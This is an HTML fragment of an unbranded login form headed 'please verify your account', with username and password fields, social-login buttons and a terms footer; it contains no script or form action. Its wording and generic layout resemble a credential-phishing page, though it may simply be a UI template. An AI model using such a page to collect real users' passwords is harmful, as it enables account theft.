    <div class="login-container">
        
        
        <div class="login-form">
            <h1>please verify your account</h1>
            
            <div id="message" class="message"></div>
            
            <div class="input-group">
                <input type="text" placeholder="Username or email" id="username" required>
            </div>
            
            <div class="input-group">
                <input type="password" placeholder="Password" id="password" required>
            </div>
            
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
            
            <button class="login-button" id="loginBtn">
                <span class="loading-spinner" id="spinner"></span>
                <span id="buttonText">Log in</span>
            </button>
            
            <div class="divider">
                <span>or continue with</span>
            </div>
            
            <div class="social-login">
                <button class="social-button facebook">
                    <i class="fab fa-facebook"></i>
                    Facebook
                </button>
                <button class="social-button google">
                    <i class="fab fa-google"></i>
                    Google
                </button>
                <button class="social-button twitter">
                    <i class="fab fa-twitter"></i>
                    Twitter
                </button>
            </div>
            
            <div class="signup-link">
                <p>Don't have an account? <a href="#" id="signupLink">Sign up</a></p>
            </div>
        </div>
        
        <div class="footer">
            <p>By continuing, you agree to Our <a href="#">Terms of Service</a> and confirm that you have read our <a href="#">Privacy Policy</a>.</p>
